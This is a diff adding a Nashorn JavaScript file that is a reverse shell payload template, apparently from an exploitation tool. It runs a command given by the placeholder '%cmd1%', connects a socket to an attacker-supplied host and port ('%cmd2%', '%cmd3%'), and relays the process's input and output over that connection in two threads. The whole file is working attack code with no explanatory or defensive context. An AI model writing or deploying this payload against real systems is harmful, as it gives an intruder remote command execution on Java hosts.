@@ -1,0 +1,40 @@
+try{
+    load("nashorn:mozilla_compat.js");
+}catch(e){}
+importPackage(Packages.java.util);
+importPackage(Packages.java.lang);
+importPackage(Packages.java.io);
+importPackage(Packages.java.net);
+
+
+function StreamConnector(is,os){
+    return function(){
+        try{
+            var bin  = new BufferedReader( new InputStreamReader( is ) );
+            var bout = new BufferedWriter( new OutputStreamWriter( os ) );
+            var charArrType =  Java.type("char[]"); 
+            var buffer = new charArrType(8192);
+            var length;
+            while((length = bin.read( buffer, 0, buffer.length))>0){
+                bout.write( buffer, 0, length );
+                bout.flush();
+            }
+        } catch(e){
+            print(e);
+        }
+        try {
+            if( bin != null )
+                bin.close();
+            if( bout != null )
+                bout.close();
+        } catch(  e ){
+           
+        }
+    }
+}
+
+var ds = Runtime.getRuntime().exec( "%cmd1%" );
+var ts = new Socket( "%cmd2%", %cmd3% );
+
+(new java.lang.Thread(StreamConnector(ds.getInputStream(),ts.getOutputStream()))).start();
+(new java.lang.Thread(StreamConnector(ts.getInputStream(),ds.getOutputStream()))).start();
